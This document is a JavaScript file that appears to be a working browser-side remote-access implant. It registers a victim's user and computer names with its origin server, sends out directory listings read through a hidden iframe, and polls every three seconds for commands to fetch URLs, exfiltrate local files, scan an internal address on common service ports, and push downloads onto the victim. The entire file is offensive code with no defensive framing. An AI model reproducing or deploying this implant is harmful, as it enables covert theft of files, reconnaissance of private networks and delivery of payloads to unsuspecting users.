/**
 * CONSTANTS
 */
const WINDOW_LOCATION = window.location;
const LOCATION_SEARCH = WINDOW_LOCATION.search;
const API_URL = (new URL((document.currentScript).src)).origin;
const WINDOW_PATHNAME = WINDOW_LOCATION.pathname;

/**
 * FUNCTIONS
 */
async function post_data(post_headers, source_data) {
    const response = await fetch(
        API_URL,
        {
            method: 'POST',
            headers: post_headers,
            body: source_data
        }
    ).catch(() => { });
    if (response !== undefined) {
        return await response.json().catch(() => { });
    }
}

function iframe_content(iframe_element, source_directory, callback_function) {
    iframe_element.src = source_directory;
    iframe_element.onload = () => {
        callback_function(((iframe_element.contentDocument).body).innerHTML);
    };
}

async function get_action(client_identifier) {
    const response = await fetch(
        API_URL,
        {
            method: 'GET',
            headers: {
                'X-Identifier': client_identifier
            }
        }
    ).catch(() => { });
    if (response !== undefined) {
        return await response.json().catch(() => { });
    }
}

async function get_content(destination_url) {
    const response = await fetch(
        destination_url,
        {
            method: 'GET',
            mode: 'no-cors'
        }
    ).catch(() => { });
    if (response !== undefined) {
        return await response.text().catch(() => { });
    }
}

async function blob_content(source_file) {
    const response = await fetch(
        source_file,
        {
            method: 'GET',
            mode: 'no-cors'
        }
    ).catch(() => { });
    if (response !== undefined) {
        return await response.blob().catch(() => { });
    }
}

async function headers_body(destination_protocol, destination_address, destination_port) {
    const TIMEOUT = (milliseconds) => {
        return new Promise(
            (resolve, reject) => {
                setTimeout(
                    () => {
                        reject();
                    }, milliseconds
                );
            }
        );
    }
    let destination_url = `${destination_protocol}://${destination_address}:${destination_port}/`;
    let response_headers = '';
    let response_body = null;
    try {
        const response = await Promise.race([
            fetch(
                destination_url,
                {
                    method: 'GET',
                    headers: {
                        'Accept': '*/*',
                        'User-Agent': 'Mozilla/5.0'
                    }
                }
            ),
            TIMEOUT(5000)
        ]);
        if (response !== undefined) {
            for (let [key, value] of response.headers.entries()) {
                response_headers += `${key}: ${value}\n`;
            };
            response_body = await response.text();
        }
    } catch { }
    return [destination_url, response_headers, response_body];
}

/**
 * API
 */
if (LOCATION_SEARCH) {
    const search_params = (new URLSearchParams(LOCATION_SEARCH));
    if (search_params.has('u') && search_params.has('c')) {
        const user_name = search_params.get('u');
        const computer_name = search_params.get('c');
        const platform_name = navigator.userAgentData.platform;
        if (user_name && computer_name) {
            post_data({ 'Content-Type': 'text/plain; charset=utf-8', 'X-User': user_name, 'X-Computer': computer_name, 'X-Platform': platform_name }, null).then(
                (post_response) => {
                    if (post_response !== undefined && ('client_identifier' in post_response)) {
                        const body_element = document.querySelector('body');
                        const iframe_element = document.createElement('iframe');
                        body_element.insertBefore(iframe_element, body_element.firstChild);
                        const source_directory = `${WINDOW_PATHNAME.substring(0, WINDOW_PATHNAME.lastIndexOf('/'))}/`;
                        const client_identifier = post_response.client_identifier;
                        iframe_content(iframe_element, source_directory, (iframe_data) => {
                            post_data({ 'Content-Type': 'text/html; charset=utf-8', 'X-Identifier': client_identifier }, iframe_data).then(
                                () => {
                                    setInterval(() => {
                                        get_action(client_identifier).then(
                                            (get_response) => {
                                                if (get_response !== undefined) {
                                                    switch (true) {
                                                        case ('access_url' in get_response):
                                                            return get_content(get_response.access_url).then(
                                                                (get_data) => {
                                                                    post_data({ 'Content-Type': 'application/octet-stream; charset=utf-8', 'X-Identifier': client_identifier }, get_data).then(
                                                                        () => { }
                                                                    );
                                                                }
                                                            );
                                                        case ('browse_directory' in get_response):
                                                            return iframe_content(iframe_element, get_response.browse_directory, (iframe_data) => {
                                                                post_data({ 'Content-Type': 'text/html; charset=utf-8', 'X-Identifier': client_identifier }, iframe_data).then(
                                                                    () => { }
                                                                );
                                                            });
                                                        case ('download_file' in get_response):
                                                            return blob_content(get_response.download_file).then(
                                                                (blob_data) => {
                                                                    post_data({ 'Content-Type': 'application/octet-stream; charset=utf-8', 'X-Identifier': client_identifier }, blob_data).then(
                                                                        () => { }
                                                                    );
                                                                }
                                                            );
                                                        case ('scan_address' in get_response):
                                                            const destination_address = get_response.scan_address;
                                                            (async () => {
                                                                const scan_data = await Promise.all([
                                                                    headers_body('http', destination_address, 80),
                                                                    headers_body('https', destination_address, 443),
                                                                    headers_body('http', destination_address, 631),
                                                                    headers_body('http', destination_address, 3306),
                                                                    headers_body('http', destination_address, 5000),
                                                                    headers_body('http', destination_address, 8080),
                                                                    headers_body('https', destination_address, 8443),
                                                                    headers_body('http', destination_address, 8888),
                                                                    headers_body('http', destination_address, 9100)
                                                                ]);
                                                                post_data({ 'Content-Type': 'text/plain; charset=utf-8', 'X-Identifier': client_identifier }, scan_data).then(
                                                                    () => { }
                                                                );
                                                            })();
                                                            return null;
                                                        case ('upload_url' in get_response): {
                                                            const download_link = document.createElement('a');
                                                            download_link.href = get_response.upload_url;
                                                            download_link.download = null;
                                                            body_element.insertBefore(download_link, body_element.firstChild);
                                                            download_link.click();
                                                            body_element.removeChild(download_link);
                                                            return null;
                                                        }
                                                    }
                                                }
                                            }
                                        );
                                    }, 3000);
                                }
                            );
                        });
                    }
                }
            );
        }
    }
}